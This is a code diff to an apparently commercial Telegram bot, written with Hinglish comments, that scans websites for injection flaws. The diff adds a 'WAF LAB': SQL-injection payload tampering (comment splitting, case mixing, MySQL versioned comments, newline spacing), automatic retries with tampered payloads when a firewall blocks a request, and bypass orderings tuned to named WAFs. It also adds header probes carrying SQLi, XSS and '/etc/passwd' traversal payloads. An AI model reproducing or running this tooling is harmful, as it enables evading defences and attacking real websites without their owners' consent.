@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.23.0"
-BUILD = "web-inject"    # feature flags — /ping me dikhte hain
+VERSION = "v2.24.0"
+BUILD = "waf-lab"       # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -4071,13 +4071,13 @@ def waf_detect(status: int, headers=None, body: str = "") -> str:
     return ""
 
 
-TAMPER_MODES = ("comment", "case", "both")
+TAMPER_MODES = ("comment", "case", "both", "version", "space", "mixed")
 
-# WAF bypass — keyword ko comment se todna (MySQL/Postgres dono me valid)
+# WAF bypass — keyword todna / case badalna / versioned comment (MySQL)
 _COMMENT_SPLIT_WORDS = ("select", "union", "information_schema", "group_concat",
                         "concat", "database", "version", "order", "sleep",
                         "table_name", "column_name", "limit", "where", "from",
-                        "and", "or")
+                        "and", "or", "having", "extractvalue", "updatexml")
 
 
 def _split_kw(word: str) -> str:
@@ -4091,12 +4091,20 @@ def _mixcase(word: str) -> str:
     return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(str(word)))
 
 
+def _ver_kw(word: str, ver: str = "50000") -> str:
+    """SELECT → /*!50000SELECT*/ — MySQL versioned comment, WAF ke regex se bachta hai."""
+    return "/*!%s%s*/" % (ver, str(word).upper())
+
+
 def waf_tamper(payload: str, mode: str = "comment") -> str:
     """WAF bypass shape — payload ka matlab wahi, dikhna alag.
 
-    comment : SE/**/LECT, UN/**/ION, A/**/ND
+    comment : SEL/**/ECT, UN/**/ION, A/**/ND
     case    : SeLeCt
     both    : case + comment
+    version : /*!50000UNION*/ /*!50000SELECT*/   (MySQL, asli SQL chalta hai)
+    space   : space → newline (%0a) — kai WAF regex \s+ nahi pakadte
+    mixed   : version + case ek saath (sabse aggressive)
     Trailing comment (-- - / #) ko chhua nahi jata — warna query toot jati hai.
     """
     p = str(payload or "")
@@ -4110,7 +4118,7 @@ def waf_tamper(payload: str, mode: str = "comment") -> str:
     if mm:
         tail = mm.group(0)
         p = p[:mm.start()]
-    if m in ("case", "both"):
+    if m in ("case", "both", "mixed"):
         for w in _COMMENT_SPLIT_WORDS:
             p = re.sub(r"\b%s\b" % re.escape(w), lambda x: _mixcase(x.group(0)),
                        p, flags=re.I)
@@ -4118,14 +4126,108 @@ def waf_tamper(payload: str, mode: str = "comment") -> str:
         for w in _COMMENT_SPLIT_WORDS:
             p = re.sub(r"\b%s\b" % re.escape(w), lambda x: _split_kw(x.group(0)),
                        p, flags=re.I)
+    if m == "version":
+        for w in _COMMENT_SPLIT_WORDS:
+            p = re.sub(r"\b%s\b" % re.escape(w), lambda x: _ver_kw(x.group(0)),
+                       p, flags=re.I)
+    if m == "mixed":
+        # har doosra keyword versioned comment, baaki case-mixed
+        seen = {"n": 0}
+
+        def _mix(x):
+            seen["n"] += 1
+            return _ver_kw(x.group(0)) if seen["n"] % 2 else _mixcase(x.group(0))
+
+        for w in _COMMENT_SPLIT_WORDS:
+            p = re.sub(r"\b%s\b" % re.escape(w), _mix, p, flags=re.I)
+    if m == "space":
+        p = p.replace(" ", "\n")
     return p + tail
+
+
+# WAF ka block — status ya signature, dono se
+def waf_blocked(status: int, headers=None, body: str = "") -> bool:
+    if not status:
+        return False
+    if int(status) in WAF_STATUS:
+        return True
+    return bool(waf_detect(status, headers, body))
+
+
+# Kaunse tamper modes try karne hain — DBMS ke hisaab se (order matter)
+def waf_bypass_chain(waf: str = "", dbms: str = "") -> list:
+    db = str(dbms or "").lower()
+    if any(x in db for x in ("mssql", "sql server", "oracle", "postgres", "postgre")):
+        base = ["comment", "case", "both", "space"]
+    else:
+        base = ["comment", "version", "both", "space", "case"]
+    try:
+        pref = str(sget("wafmode", "auto") or "auto").lower()
+    except Exception:
+        pref = "auto"
+    wf = str(waf or "").lower()
+    if pref in TAMPER_MODES:
+        # user ka manual mode sabse pehle — WAF-specific guess usko overtake nahi karta
+        base = [pref] + [m for m in base if m != pref]
+    elif "modsecurity" in wf or "wordfence" in wf:
+        base = ["comment"] + [m for m in base if m != "comment"]
+    elif "cloudflare" in wf:
+        base = ["version"] + [m for m in base if m != "version"]
+    return base
 
 
 def _waf_modes_for(det: dict) -> list:
     """WAF mila to kaunse tampers try karne hain (order matter)."""
     if not det.get("waf"):
         return [""]
-    return ["", "comment", "case", "both"]
+    return [""] + waf_bypass_chain(det.get("waf"), det.get("dbms"))
+
+
+async def waf_send(send, payload: str, fam: str = "sqli", waf: str = "",
+                   retry=None) -> tuple:
+    """Ek request → block hui to tampered payloads se retry.
+
+    send  = async callable(payload) → response dict (status/headers/body)
+    Return: (response, payload_used, mode_used, blocked_count)
+    Sirf un families par tamper hota hai jinme SQL-ish keywords hote hain —
+    XSS payload ko todna usko hi kharab kar deta hai.
+    """
+    try:
+        gap = max(0.0, min(2.0, int(sget("waf_gap_ms", 400) or 0) / 1000.0))
+    except Exception:
+        gap = 0.4
+
+    async def _breathe():
+        if gap:
+            await asyncio.sleep(gap)
+
+    r = await send(payload)
+    blocked, wf_name = 0, ""
+    if not waf_blocked(r.get("status"), r.get("headers"), r.get("body")):
+        return r, payload, "", blocked, wf_name
+    blocked += 1
+    wf_name = waf_detect(r.get("status"), r.get("headers"), r.get("body")) or "Unknown WAF"
+    await _breathe()
+    if fam not in ("sqli", "blind", "union", "ssti", "lfi"):
+        return r, payload, "", blocked, wf_name
+    try:
+        n = int(sget("wafretry", 2) or 2) if retry is None else int(retry)
+    except Exception:
+        n = 2
+    for mode in waf_bypass_chain(waf, "")[:max(0, n)]:
+        tp = waf_tamper(payload, mode)
+        if tp == payload:
+            continue
+        r2 = await send(tp)
+        if r2.get("status") and not waf_blocked(r2.get("status"), r2.get("headers"),
+                                                r2.get("body")):
+            return r2, tp, mode, blocked, wf_name
+        if waf_blocked(r2.get("status"), r2.get("headers"), r2.get("body")):
+            blocked += 1
+            wf_name = wf_name or (waf_detect(r2.get("status"), r2.get("headers"),
+                                             r2.get("body")) or "Unknown WAF")
+        await _breathe()
+    return r, payload, "", blocked, wf_name
 
 
 # ── 4) HTTP layer (GET/POST + session headers) ────────────────────────────────
@@ -4199,8 +4301,9 @@ async def post_scan(urls: list, cat: str = "all", timeout: float = 8.0,
           "safe_urls": [], "vuln_urls": [], "no_form": 0, "blocked": 0,
           "errors": 0, "waf": "", "start": time.time(), "stopped": 0,
           "stage": "forms", "mode": "post", "cat": cat,
-          "done_urls": [], "param_forms": 0, "stored": 0,
-          "by_type": {}, "took": 0.0, "second_order": bool(second_order)}
+          "done_urls": [], "param_forms": 0, "stored": 0, "blocked_req": 0,
+          "tamper_hits": 0, "by_type": {}, "took": 0.0,
+          "second_order": bool(second_order)}
     if not urls:
         st["took"] = 0.0
         return st
@@ -4258,30 +4361,43 @@ async def post_scan(urls: list, cat: str = "all", timeout: float = 8.0,
                     for fam, pl in probes:
                         if uid and stop_requested(uid):
                             break
-                        data = dict(base_data)
-                        data[fld["name"]] = pl
-                        if f["method"] == "post":
-                            r = await _web_req(session, "POST", f["action"], timeout,
-                                               data=data, headers=hdrs, rot=rot)
-                        else:
-                            u2 = inj_build_case(f["action"], fld["name"], pl)
-                            r = await _web_req(session, "GET", u2, timeout,
-                                               headers=hdrs, rot=rot)
+
+                        async def _send(_p, _f=f, _fld=fld, _bd=base_data):
+                            if _f["method"] == "post":
+                                d = dict(_bd)
+                                d[_fld["name"]] = _p
+                                return await _web_req(session, "POST", _f["action"],
+                                                      timeout, data=d, headers=hdrs, rot=rot)
+                            return await _web_req(
+                                session, "GET",
+                                inj_build_case(_f["action"], _fld["name"], _p),
+                                timeout, headers=hdrs, rot=rot)
+
+                        #  v2.24.0 — block hua to tampered shape se retry (asli bypass)
+                        r, pl_eff, tamper, _nblk, _wf = await waf_send(
+                            _send, pl, fam, st.get("waf") or "")
                         async with lock:
                             st["tested"] += 1
+                            st["blocked_req"] += _nblk
+                            if tamper:
+                                st["tamper_hits"] += 1
+                            if _wf and not st["waf"]:
+                                st["waf"] = _wf
                         if not r["status"]:
                             async with lock:
                                 st["errors"] += 1
                             continue
-                        v = inj_verdict(fam, pl, r["status"], r["headers"], r["body"],
+                        v = inj_verdict(fam, pl_eff, r["status"], r["headers"], r["body"],
                                         urlparse(f["action"]).hostname or "",
                                         base["body"], baseline_ok=bool(base["status"]))
                         if not v:
                             continue
-                        # confirm — doosra payload (same family)
+                        # confirm — doosra payload (same family, same tamper)
                         pl2 = INJ_CONFIRM.get(fam)
+                        if pl2 and tamper:
+                            pl2 = waf_tamper(pl2, tamper)
                         okk = True
-                        if pl2 and pl2 != pl:
+                        if pl2 and pl2 != pl_eff:
                             d2 = dict(base_data)
                             d2[fld["name"]] = pl2
                             if f["method"] == "post":
@@ -4304,11 +4420,11 @@ async def post_scan(urls: list, cat: str = "all", timeout: float = 8.0,
                             if back["status"] and pl and pl in (back["body"] or ""):
                                 stored = True
                         item = {"base": raw, "url": f["action"], "param": fld["name"],
-                                "payload": pl, "type": ("STORED XSS" if stored else v["type"]),
+                                "payload": pl_eff, "type": ("STORED XSS" if stored else v["type"]),
                                 "dbms": v.get("dbms", ""), "evidence": v.get("evidence", ""),
                                 "status": r["status"], "confirmed": True,
                                 "method": f["method"].upper(), "form": form_label(f),
-                                "stored": stored}
+                                "stored": stored, "tamper": tamper}
                         async with lock:
                             key = (raw, f["action"], fld["name"], item["type"])
                             if key not in {(x["base"], x["url"], x["param"], x["type"])
@@ -4347,9 +4463,14 @@ HEADER_PROBES = [
     ("User-Agent", "sqli", "'"),
     ("Referer", "sqli", "'"),
     ("X-Forwarded-For", "sqli", "'"),
+    #  v2.24.0 — keyword wala probe: WAF comment/case se tootta hai, bare quote nahi
+    ("Referer", "sqli", "' AND 1=1-- -"),
+    ("User-Agent", "sqli", "' AND 1=1-- -"),
+    ("X-Forwarded-For", "sqli", "' AND 1=1-- -"),
+    ("Cookie", "sqli", "'"),
+    ("Cookie", "sqli", "' AND 1=1-- -"),
     ("X-Forwarded-Host", "xss", '"><svg/onload=alert(1)>'),
     ("X-Original-URL", "lfi", "../../../../etc/passwd"),
-    ("Cookie", "sqli", "'"),
 ]
 HEADER_NAMES = ("User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
                 "X-Original-URL", "Cookie")
@@ -4363,8 +4484,8 @@ async def header_scan(urls: list, timeout: float = 8.0, conc: int = 8,
           "vuln_urls": [], "blocked": 0, "errors": 0, "waf": "", "start": time.time(),
           "stopped": 0, "stage": "headers", "mode": "header", "cat": "header",
           "done_urls": [], "no_form": 0, "forms": 0, "param_forms": 0, "stored": 0,
-          "by_type": {}, "took": 0.0, "second_order": False,
-          "headers_tested": len(HEADER_PROBES)}
+          "blocked_req": 0, "tamper_hits": 0, "by_type": {}, "took": 0.0,
+          "second_order": False, "headers_tested": len(HEADER_PROBES)}
     if not urls:
         return st
     sid = user_session_get(uid) if uid else {}
@@ -4398,22 +4519,38 @@ async def header_scan(urls: list, timeout: float = 8.0, conc: int = 8,
             for hname, fam, pl in HEADER_PROBES:
                 if uid and stop_requested(uid):
                     break
-                hs = dict(base_hdrs)
-                hs[hname] = pl
-                r = await _web_req(session, "GET", raw, timeout, headers=hs)
+                def _mk(_p, _h=hname):
+                    hh = dict(base_hdrs)
+                    hh[_h] = _p
+                    return hh
+
+                async def _send(_p, _h=hname):
+                    return await _web_req(session, "GET", raw, timeout,
+                                          headers=_mk(_p, _h))
+
+                #  v2.24.0 — header block hua to tampered value se retry
+                r, pl_eff, tamper, _nblk, _wf = await waf_send(
+                    _send, pl, fam, st.get("waf") or "")
                 async with lock:
                     st["tested"] += 1
+                    st["blocked_req"] += _nblk
+                    if tamper:
+                        st["tamper_hits"] += 1
+                    if _wf and not st["waf"]:
+                        st["waf"] = _wf
                 if not r["status"]:
                     async with lock:
                         st["errors"] += 1
                     continue
-                v = inj_verdict(fam, pl, r["status"], r["headers"], r["body"], host,
+                v = inj_verdict(fam, pl_eff, r["status"], r["headers"], r["body"], host,
                                 base["body"], baseline_ok=True)
                 if not v:
                     continue
                 # confirm
                 pl2 = INJ_CONFIRM.get(fam)
-                if pl2 and pl2 != pl:
+                if pl2 and tamper:
+                    pl2 = waf_tamper(pl2, tamper)
+                if pl2 and pl2 != pl_eff:
                     hs2 = dict(base_hdrs)
                     hs2[hname] = pl2
                     r2 = await _web_req(session, "GET", raw, timeout, headers=hs2)
@@ -4423,7 +4560,8 @@ async def header_scan(urls: list, timeout: float = 8.0, conc: int = 8,
                         continue
                 async with lock:
                     st["vulns"].append({"base": raw, "url": raw, "param": hname,
-                                        "payload": pl, "type": v["type"],
+                                        "payload": pl_eff, "type": v["type"],
+                                        "tamper": tamper,
                                         "dbms": v.get("dbms", ""),
                                         "evidence": v.get("evidence", ""),
                                         "status": r["status"], "confirmed": True,
@@ -4451,6 +4589,63 @@ async def header_scan(urls: list, timeout: float = 8.0, conc: int = 8,
         st["by_type"][v["type"]] = st["by_type"].get(v["type"], 0) + 1
     st["speed_urls"] = round(st["done"] / max(0.001, st["took"]), 2)
     return st
+
+
+# ── 7) WAF LAB — ek URL par har tamper mode ka ASLI test ──────────────────────
+WAF_TEST_PAYLOAD = "' AND 1=1-- -"
+
+
+async def waf_probe(url: str, timeout: float = 8.0, uid=None) -> dict:
+    """URL par saare tamper modes try karke batao kaunsa WAF ke paar jata hai.
+
+    Har mode ke liye ek asli request jati hai (SQL-ish probe). Result me
+    status + blocked + WAF ka naam — guess nahi, measured.
+    """
+    out = {"url": str(url or ""), "status": 0, "waf": "", "base_blocked": False,
+           "param": "", "modes": [], "took": 0.0}
+    if not out["url"].startswith("http"):
+        return out
+    t0 = time.time()
+    hdrs = user_session_headers(uid) if uid else {}
+    try:
+        param = (parse_qsl(urlparse(out["url"]).query, keep_blank_values=True) or [("q", "")])[0][0]
+    except Exception:
+        param = "q"
+    out["param"] = param
+    conn = mk_connector(limit=4, force_close=True)
+    async with aiohttp.ClientSession(connector=conn) as session:
+        base = await _web_req(session, "GET", out["url"], timeout, headers=hdrs)
+        out["status"] = int(base.get("status") or 0)
+        out["waf"] = waf_detect(base.get("status"), base.get("headers"), base.get("body"))
+        out["base_blocked"] = waf_blocked(base.get("status"), base.get("headers"),
+                                          base.get("body"))
+        for mode in [""] + list(TAMPER_MODES):
+            pl = WAF_TEST_PAYLOAD if not mode else waf_tamper(WAF_TEST_PAYLOAD, mode)
+            u = inj_build_case(out["url"], param, pl)
+            r = await _web_req(session, "GET", u, timeout, headers=hdrs)
+            wf = waf_detect(r.get("status"), r.get("headers"), r.get("body"))
+            out["modes"].append({
+                "mode": mode or "plain", "status": int(r.get("status") or 0),
+                "blocked": waf_blocked(r.get("status"), r.get("headers"), r.get("body")),
+                "waf": wf, "len": len(r.get("body") or ""), "err": r.get("err") or ""})
+    out["took"] = time.time() - t0
+    if not out["waf"]:
+        out["waf"] = next((m["waf"] for m in out["modes"] if m.get("waf")), "")
+    fired = bool(out["waf"] or out["base_blocked"]
+                 or any(m["blocked"] for m in out["modes"]))
+    out["waf_fired"] = fired
+    passed = [m["mode"] for m in out["modes"] if m["status"] and not m["blocked"]]
+    blocked_modes = [m["mode"] for m in out["modes"] if m["blocked"]]
+    out["passed"] = passed
+    out["blocked_modes"] = blocked_modes
+    if not fired:
+        out["verdict"] = "WAF ne kuch block nahi kiya — plain payload bhi pass"
+    elif passed:
+        out["verdict"] = ("WAF active (%s) — ye modes pass hue: %s"
+                          % (out["waf"] or "unknown", ", ".join(passed)))
+    else:
+        out["verdict"] = "WAF ne har mode block kiya — is site par SQLi chhodo"
+    return out
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -8516,6 +8711,12 @@ async def _route_tool_cb(update, context, data: str):
             return await tool_inj_header(update, context)
         if rest == "header_last":
             return await cb_inj_mode_last(update, context, "header")
+        if rest == "waf":
+            return await tool_inj_waf(update, context)
+        if rest == "waf_go":
+            return await cb_inj_waf_go(update, context)
+        if rest == "waf_mode":
+            return await cb_inj_waf_mode(update, context)
         if rest == "session":
             return await cb_inj_session(update, context)
         if rest == "session_set":
@@ -10586,6 +10787,8 @@ async def tool_inj(update, context):
                                       callback_data="inj:last")])
     rows.append([InlineKeyboardButton("📮 POST FORMS (login/search)", callback_data="inj:post"),
                  InlineKeyboardButton("🧾 HEADERS", callback_data="inj:header")])
+    rows.append([InlineKeyboardButton("🛡 WAF LAB (bypass test)",
+                                      callback_data="inj:waf")])
     rows.append([InlineKeyboardButton("🍪 SESSION / AUTH%s"
                                       % (" ✅" if user_session_get(update.effective_user.id)
                                          else ""),
@@ -11092,6 +11295,10 @@ def _webscan_card(st: dict) -> str:
         body += "🧾 Headers tested : <code>%s</code>\n" % fmt(st.get("headers_tested", 0))
     if st.get("waf"):
         body += "🛡 WAF hit        : <b>%s</b>\n" % esc(st["waf"])
+    if st.get("blocked_req"):
+        body += "⛔ Blocked reqs   : <code>%s</code>\n" % fmt(st["blocked_req"])
+    if st.get("tamper_hits"):
+        body += "🧬 Tamper bypass  : <code>%s</code> requests pass hue\n" % fmt(st["tamper_hits"])
     if st.get("errors"):
         body += "⚠️ Errors          : <code>%s</code>\n" % fmt(st["errors"])
     if st.get("stopped"):
@@ -11105,7 +11312,8 @@ def _webscan_card(st: dict) -> str:
         for v in vulns[:6]:
             body += ("\n\n%s <b>%s</b>%s\n   <code>%s</code>\n"
                      "   <i>%s · %s · field <code>%s</code></i>"
-                     % (INJ_STYLE.get(v["type"], "⚠️"), esc(v["type"]),
+                     % (INJ_STYLE.get(v["type"], "⚠️"),
+                        esc(v["type"]) + ((" · 🧬" + esc(v["tamper"])) if v.get("tamper") else ""),
                         (" · " + esc(v.get("dbms"))) if v.get("dbms") else "",
                         esc((v.get("url") or "")[:150]),
                         esc(v.get("method") or "GET"), esc(v.get("form") or "")[:50],
@@ -11332,6 +11540,131 @@ async def cb_inj_relast(update, context):
             pass
         return
     return await _run_inject(update, context, urls)
+
+
+# ── 🛡 WAF LAB (v2.24.0) — detect + kaunsa tamper pass hota hai, measured ────
+WAF_MODE_CHOICES = ["auto"] + list(TAMPER_MODES)
+
+
+def waf_mode_get() -> str:
+    try:
+        m = str(sget("wafmode", "auto") or "auto").lower()
+    except Exception:
+        m = "auto"
+    return m if m in WAF_MODE_CHOICES else "auto"
+
+
+def waf_lab_kb() -> InlineKeyboardMarkup:
+    return RK([
+        [InlineKeyboardButton("🧪 TEST A URL (asli)", callback_data="inj:waf_go")],
+        [InlineKeyboardButton("🎛 MODE: %s" % waf_mode_get().upper(),
+                              callback_data="inj:waf_mode")],
+        [InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")],
+    ])
+
+
+def waf_lab_card() -> str:
+    sample = "' UNION SELECT 1,2-- -"
+    lines = []
+    for m in TAMPER_MODES:
+        lines.append("• <b>%s</b> — <code>%s</code>"
+                     % (m, esc(waf_tamper(sample, m)[:64])))
+    return (H("WAF LAB", "detect + tamper bypass") + "\n\n"
+            + KV("Known WAFs", "<code>%d</code> signatures + Unknown" % len(WAF_SIGNS), "🛡") + "\n"
+            + KV("Default mode", "<b>%s</b>" % waf_mode_get(), "🎛") + "\n"
+            + KV("Tamper retries", "<code>%d</code> / probe" % int(sget("wafretry", 2) or 2), "🔁") + "\n"
+            + KV("Gap after block", "<code>%d ms</code>" % int(sget("waf_gap_ms", 400) or 0), "⏳") + "\n\n"
+            + B("Tamper styles (asli output)") + "\n" + "\n".join(lines) + "\n\n"
+            + B("Kahan lagta hai") + "\n"
+            + P("POST forms · header injection · SQLi detect · dumper — block mile to "
+                "wahi payload tampered shape me dobara jata hai.") + "\n\n"
+            + B("Saaf baat") + "\n"
+            + P("Ye regex/comment/case/version tricks hain — 100% guarantee nahi. "
+                "Cloudflare ka JS challenge, IP ban ya rate-limit isse nahi khulta.") + "\n\n"
+            + P("🧪 TEST A URL se pata chalega is site par kaunsa mode pass hota hai."))
+
+
+def waf_result_card(res: dict) -> str:
+    rows = []
+    for m in res.get("modes") or []:
+        icon = "⛔" if m.get("blocked") else ("✅" if m.get("status") else "⚠️")
+        rows.append("%s <b>%s</b> — <code>%s</code>%s"
+                    % (icon, esc(m.get("mode") or "?"), m.get("status") or "err",
+                       (" · " + esc(m.get("waf"))) if m.get("waf") else ""))
+    return (H("WAF LAB — RESULT", "%.1fs" % res.get("took", 0)) + "\n\n"
+            + "🔗 <code>%s</code>\n" % esc((res.get("url") or "")[:110])
+            + KV("Base status", "<code>%s</code>" % (res.get("status") or "—"), "📡")
+            + KV("WAF", "<b>%s</b>" % esc(res.get("waf") or "none"), "🛡")
+            + KV("Param tested", "<code>%s</code>" % esc(res.get("param") or "—"), "🎯") + "\n\n"
+            + B("Modes") + "\n" + "\n".join(rows) + "\n\n"
+            + "🏁 <b>%s</b>" % esc(res.get("verdict") or "—"))
+
+
+async def tool_inj_waf(update, context):
+    try:
+        await update.callback_query.edit_message_text(
+            waf_lab_card(), parse_mode=ParseMode.HTML, reply_markup=waf_lab_kb())
+    except Exception:
+        pass
+
+
+async def cb_inj_waf_go(update, context):
+    try:
+        await update.callback_query.edit_message_text(
+            (H("WAF LAB", "send a URL") + "\n\n"
+             + P("Ek URL bhejo — bot plain probe aur har tamper mode, dono try "
+                 "karke batayega kaunsa pass hota hai.") + "\n\n"
+             + "<code>https://target.com/product.php?id=5</code>\n\n"
+             + P("Sirf apni ya authorized site par chalao.")),
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:inj"))
+    except Exception:
+        pass
+    await_set(context, "waf_test")
+
+
+async def cb_inj_waf_mode(update, context):
+    cur = waf_mode_get()
+    nxt = WAF_MODE_CHOICES[(WAF_MODE_CHOICES.index(cur) + 1) % len(WAF_MODE_CHOICES)]
+    sset("wafmode", nxt)
+    try:
+        await update.callback_query.answer("Mode: %s" % nxt.upper(), show_alert=False)
+    except Exception:
+        pass
+    return await tool_inj_waf(update, context)
+
+
+async def input_waf_test(update, context, text: str):
+    urls = [u.strip() for u in str(text or "").splitlines() if u.strip().startswith("http")]
+    if not urls:
+        await reply_msg(update).reply_text(
+            "❌ Full URL bhejo — <code>https://site.com/page.php?id=5</code>",
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:inj"))
+        await_set(context, "waf_test")
+        return
+    url = urls[0]
+    msg = await reply_msg(update).reply_text(
+        "🛡 WAF test chal raha hai…\n<code>%s</code>" % esc(url[:120]),
+        parse_mode=ParseMode.HTML)
+    try:
+        res = await waf_probe(url, timeout=float(sget("inj_timeout", 8) or 8),
+                              uid=str(update.effective_user.id))
+    except Exception as exc:
+        logger.exception("waf probe fail: %s", exc)
+        try:
+            await msg.edit_text("❌ Test fail: <code>%s</code>" % esc(str(exc)[:160]),
+                                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:inj"))
+        except Exception:
+            pass
+        await_clear(context)
+        return
+    context.user_data["waf_last"] = res
+    txt = waf_result_card(res)
+    try:
+        await msg.edit_text(txt, parse_mode=ParseMode.HTML, reply_markup=waf_lab_kb())
+    except Exception:
+        await reply_msg(update).reply_text(txt, parse_mode=ParseMode.HTML,
+                                           reply_markup=waf_lab_kb())
+    await_clear(context)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -12641,8 +12974,8 @@ async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
                        noise=noise, dbms=dbms_seen or "")
             break
     if not out["ok"] and out.get("waf"):
-        #  v2.23.0 — WAF-aware: wahi styles, tampered payload se ek aur chakkar
-        for _mode in ("comment", "case"):
+        #  v2.24.0 — WAF-aware: DBMS ke hisaab se tamper chain (comment/version/both…)
+        for _mode in waf_bypass_chain(out.get("waf"), dbms_seen)[:3]:
             for q, c in SQLI_STYLES[:3]:
                 if budget is not None and budget.get("left", 0) < 8:
                     break
@@ -15947,6 +16280,7 @@ AWAIT_HANDLERS["support_msg"] = lambda *a, **k: input_support(*a, **k)
 AWAIT_HANDLERS["myproxy"] = lambda *a, **k: input_myproxy(*a, **k)
 AWAIT_HANDLERS["admin_msg"] = lambda *a, **k: input_admin_msg(*a, **k)
 AWAIT_HANDLERS["session_set"] = lambda *a, **k: input_session(*a, **k)
+AWAIT_HANDLERS["waf_test"] = lambda *a, **k: input_waf_test(*a, **k)
 
 
 TOOL_HANDLERS = {
@@ -17037,6 +17371,8 @@ BATCH_KEYS = {
     "postfields": ("post_fields", 1, 10, "POST scan: fields per form", 3, "✍️"),
     "poststored": ("post_stored", 0, 1, "POST scan: stored (2nd-order) check", 1, "💾"),
     "headerconc": ("header_conc", 1, 24, "Header scan: parallel pages", 8, "🧾"),
+    "wafretry": ("wafretry", 0, 6, "WAF: tamper retries per probe", 2, "🛡"),
+    "wafgap": ("waf_gap_ms", 0, 3000, "WAF: gap after block (ms)", 400, "⏳"),
     "discover": ("inj_discover", 0, 1, "Injector: param discovery (0/1)", 0, "🔎"),
     "discovercap": ("inj_discover_cap", 10, 5000, "Discovery: max URLs per scan", 300, "🧭"),
     "discovernames": ("inj_discover_names", 2, 40, "Discovery: param names per URL", 12, "📛"),
@@ -17081,6 +17417,8 @@ def batch_card() -> str:
             "<code>/batch postforms 2</code> · <code>/batch postfields 3</code>\n"
             "<code>/batch poststored 1</code> — POST scan: stored XSS check\n"
             "<code>/batch headerconc 8</code> — header scan parallel pages\n"
+            "<code>/batch wafretry 2</code> — WAF: har probe par tamper retries\n"
+            "<code>/batch wafgap 400</code> — WAF: block ke baad kitna gap (ms)\n"
             "<code>/batch trial 1</code> — trial lock ON (files locked)\n\n"
             "<i>Proxy batching checks 60k proxies in slices: 4k → next 4k → … "
             "until every one is done. 2000–4000 is best on a phone.</i>")
@@ -17449,6 +17787,7 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
            "🧩 Build: <code>%s</code>\n"
            "🛡 Silent-guard: %s · 💉 payloads: <code>%d</code> · ⚙️ parser-cfg: %s\n"
            "📮 POST: <code>%d form / %d field</code> · 🧾 Headers: <code>%d</code> · 🍪 Session: %s\n"
+           "🛡 WAF: <code>%d sig</code> · mode <b>%s</b> · retries <code>%d</code>\n"
            "🔐 Config: %s\n"
            "📁 File: <code>%s</code>\n"
            "🗂 Folder: <code>%s</code>\n"
@@ -17464,6 +17803,7 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
                  "✅ ON" if "cb_parse_cfg" in globals() else "⚠️ OFF",
                  sget("post_forms", 2), sget("post_fields", 3), sget("header_conc", 8),
                  ("✅ ON" if _sess else "⚪ OFF"),
+                 len(WAF_SIGNS), waf_mode_get(), int(sget("wafretry", 2) or 2),
                  ("<code>%s</code> · admins %d" %
                   (os.path.basename(CONFIG_PATH) if CONFIG_PATH else "⚠️ none (bot.py se)",
                    len(ADMIN_IDS))),
